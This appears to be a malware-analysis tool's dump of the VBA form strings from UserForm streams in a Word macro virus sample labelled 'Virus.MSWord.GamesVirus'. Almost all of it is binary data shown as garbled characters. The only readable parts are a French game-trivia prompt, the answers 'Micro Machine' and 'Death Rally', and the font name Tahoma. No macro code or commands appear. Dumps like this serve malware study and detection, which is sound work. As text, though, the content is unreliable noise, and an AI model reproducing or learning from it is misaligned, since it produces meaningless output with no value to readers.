- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TEKIFIIFKKIKQIFFIKKIIFKKKKKFJKKF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�������ö�:���Õ���������������������ß�������������������������������������������������:cmcc::::::������������������������������������������޽��������������������:��:::������:��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�:��:<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HCINAQK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�������9����ý������������ܶ����á����ܓ��������������������������������������������������o_[r::::c9::����������������������������������������������������������������::���:��:�Ó������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9�<0<I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RBCBLFMNHE99:���������������Õ����������ö������򓓛�����������������������������������������������:r[oo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r_m_co[o�������������������������������������������������������������:��:�::�<���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q9QBTFHI:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QPI9O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�SCF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GF::�����������ý���������ö���ö�������񕩩�����������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:_en^^n:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:_o�F�������������������������������������������������������������:���:�Ó��Ó���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0M�H<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NPGN�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PXQT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����������������åý������������ܶ����������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_megbb`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:cmr[c������������������������������������������������ý���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���������������������򽙥��񘙚���������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::ocdnZ^o::crro[[���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9�99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9999999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�9���������������������Þ���ý��������������������������������������������������������������:::::o:[__c::c__[[o:o��������������������������������9�������������������������������񓓓�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::::::::::<::::::::::<::::::::::<:::::::::::�������:��������������Þ������������������<������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:oee_m_o:�����������������������������������������������������������������򕕓��򓓕�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<:����:��:��::o:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ocddd___c�����������������������������ü�����������ö�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0:�����������c�cv�zz�zzvvc��czzzzvzz�cz�zv::0:������������Ó��������Ð��Ñ��������������������������������������������������������������������::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::c[o[__dd<�����������������������������η���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:09�����������z�zv�cv�zv�zz��z�zzvzzv}zv�zv::(9����������������������Ð��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::9[_roooo��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:(<����:��<��::z::z::o::oo:z::::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:oz:oo:o::(9����������������������Ð����������:�����������ܮ���������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9oc:o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������ڼ�����������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0.0::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::[:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9-(<�������������������éÖ������������������������������������������������������������������������������::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::������������������������������м������������9���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(,-),)::::::9,<:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9,9::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(:(+/:���������:������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:������o�������������������򥩩��������������������������������������������������������:��������������������������������������˼�����å����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(1,&.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00(000(,*9:(+1:-0()'+9*'/<1<0/(00(0(,::,(��������â��������������ooo������������������𩛸������������������������������������������������������������������������������������������ռ��������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/+/,',(--))),,,9(+03('*(-+&01*!(00**)-.--/,&((9��ýÝ������������������ooz����������������������������������������������������������������������������������������������������������9�������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)+-+!(*&3,-+1-2,0!("*1,//5Y(!+/*2.----Y21/,/0*(���������������������������ooo�����������������Õ���������������������������������������������������������������������������������������������������ܶ�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*,.4))4),(,&1,1,),,9**(4*..0-9**(0(-,-*Y.*/)(!/����������������������������::�������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-,*****--+(ozz0,1.&<0+),00+(,9((::::(++-)**/*(<�����������������������������o����������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,1,-.*--/ov���v0*.&,,+*,[0+*190:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:0-!.*--,(����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,,****(oz���wu{�o0+-*,.,-*Y:,(:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::9(+,**,(��������������������������������������������������򦦦���������������������������������������������������������������������������������ܽ���9��������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)+/*/0o�������w���z:0*)(*(09:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::�$5//*9���������������������������������������������������򥜜�������������������������������������������������������������������������ȼ���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+1Y*(o��������{�x���voooooz�o::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::+1**Y-0������������������������񓑓����������������������樂����������������������������������������������������������������������������������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,1/**099����������������}}��v:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:()(***,(��������������������������������������������������é�����������������������������������������������������������������������������ȼ�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,,****(9:z��������������}�vz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::::9(0./**(<<������������������������������������������������򛛟����������������������������������������������������������������������9������ܶ�ζ����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!&,-)+,(0:o��}}�����v�}}zczczo:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::0(-,!--,(������������������������Ð�����������������������򩩸���������������������������������������������������������������������޸
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1--),)**00:ov�}}}�v����zzczzo:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::0(*/Y---+(:�����������������������Ð������������������������å���������������������������������������������������������������������ܶ���������ܶ�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y!***,*/..Y((9oz}}vzzzzzzoooo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z:::990.,**--***9��������������������������������������������������������������������������������������������������������������������������������������������ζ���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!'+,-&,-,,*.-,,(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0oozzzz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ozzz:<904(*/,1,-+1,,,*���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,1)/*,**)-***.Y&1-**0<:9<99:::0(***//),)/--/*,4���������������������������������������������������������������������������������������������������������������������Ἴ������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)+***,***.**-*/*Y,&&+,+1,(((4*..//-.**,*/)-/*,9�����������������������Ö�������:����ý��������������������������������������������������������������������������������ȶɶ�������99<����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"&,-),)-),-),--,+)-,+1&3'+,,,-,,,-,--)+,-,,--Y0�����������������������Ñ�������ö���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"&Y4009-/04-,K-./000/..,-)-+--,!--,---+--,,--,/�����������������������Ð����ý�������������������������������������������������������������������������������������������˶��ล�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,,4PM?C/O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I0JX4/�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P40((0(((((((0((0(0((0(((((<�������������������Ð��������������������������񥒒������������������������������������������������������9����ܶ�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=61J0))))K)ZL"VNPA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)-)-.-,)),)-)---.,--)))-.(:������������������������������ý����������������������򛜜���������������������������������������������������񽥥����ܶ������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"2!B4,).JK0M .D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
</--,---+-.,Y)-,---+-.,,.),/:������������򶕽������������������������������������򓟜����������������������������������������������������������������������ռݶ�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4*0(�OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4((((((/0(((00((0(*(0(*00*,�������������������ý�ý���������������������������򽓛��������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7$,090::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9::9<::0::99::9:::0::990*+'������������ý���ý��������Ø������������������������쓑���������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�De quel jeu vient cette image ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Micro Machine�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Death Rally
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���鳳���������������酅������������酅���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��靝���靝������鳳��靅����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鳅��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���酅
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qyy�������������������������������������������������ο�����ǿο���ǿ���踦���ο��ͬy��������Ϳ¿�������ೳೳ����������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uZZ�������������������������������������������������ο���ǿ������ο�����¦�ũǿ��ͬ�顿������ɿ�����������������ﶅ��������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uZo�����������������������ڬ���Ե����������ԡ�y�q�뤼��ǿ������ǡ������������뵡�������¿ǿ������������������ﳶ���������������������������������������������������������wffffffffnncnccccnfnnffffffnnnnnfffnnnnfnnnfnnfw�{����������
-------------------------------------------------------------------------------
